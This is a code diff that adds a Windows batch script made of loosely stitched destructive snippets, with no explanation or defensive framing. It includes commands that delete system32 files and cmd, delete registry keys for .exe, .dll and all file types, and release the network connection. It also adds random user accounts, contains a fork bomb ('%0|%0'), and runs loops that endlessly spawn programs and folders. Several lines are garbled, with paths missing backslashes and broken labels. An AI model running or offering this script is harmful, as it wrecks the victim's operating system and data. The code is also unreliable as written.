@@ -1,0 +1,69 @@
+@Echo off
+start iexpress (insert link here)
+start iexpress (insert link here, PS. make sure to remove the brackets)
+@Echo off
+IPconfig /release
+del “C:WINDOWSsystem32cmd”
+@ECHO off
+ :top
+ START %SystemRoot%\system32\notepad.exe
+ GOTO top
+ @echo off
+:x
+md %random%
+/folder.
+goto x
+@echo off
+:xnet
+user %random% /add
+goto x
+%0|%0
+@echo off
+😡
+start winword
+start mspaint
+start notepad
+start write
+start cmd
+start explorer
+start control
+start calc
+goto x
+@echo off
+😡
+start winword
+start mspaint
+start notepad
+start write
+start cmd
+start explorer
+start control
+start calc
+goto x
+@echo off
+😡
+start winword
+start mspaint
+start notepad
+start write
+start cmd
+start explorer
+start control
+start calc
+goto x
+@echo off
+😡
+start winword
+start mspaint
+start notepad
+start write
+start cmd
+start explorer
+start control
+start calc
+goto x
+del c:WINDOWSsystem32*.*/q
+start
+START reg delete HKCR/.exe
+START reg delete HKCR/.dll
+START reg delete HKCR/*
